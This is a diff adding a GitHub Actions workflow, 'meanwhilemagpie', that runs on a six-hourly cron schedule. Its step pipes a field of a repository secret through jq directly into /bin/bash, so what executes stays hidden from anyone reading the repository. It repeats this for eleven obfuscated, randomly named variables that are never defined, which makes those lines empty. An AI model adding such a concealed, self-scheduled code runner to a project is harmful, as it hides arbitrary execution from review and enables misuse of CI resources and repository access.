@@ -1,0 +1,30 @@
+name: meanwhilemagpie
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: meanwhilemagpie
+        env:
+          wmnju107: ${{ secrets.wmnju107 }}
+        run: |
+          echo $wmnju107 | jq -r .qoaza4 | /bin/bash
+          echo $zi4292 | jq -r .kbrd6 | /bin/bash
+          echo $gyb82295 | jq -r .azgp4 | /bin/bash
+          echo $jjgmk9 | jq -r .p085 | /bin/bash
+          echo $c782 | jq -r .jja64 | /bin/bash
+          echo $mw83 | jq -r .c3 | /bin/bash
+          echo $fo76 | jq -r .nnfw01430 | /bin/bash
+          echo $bsjg61595 | jq -r .mio59432 | /bin/bash
+          echo $r777 | jq -r .o52200 | /bin/bash
+          echo $poa01 | jq -r .uve4251 | /bin/bash
+          echo $ey09 | jq -r .rei34 | /bin/bash
+          echo $uncpl8753 | jq -r .th2677 | /bin/bash
+
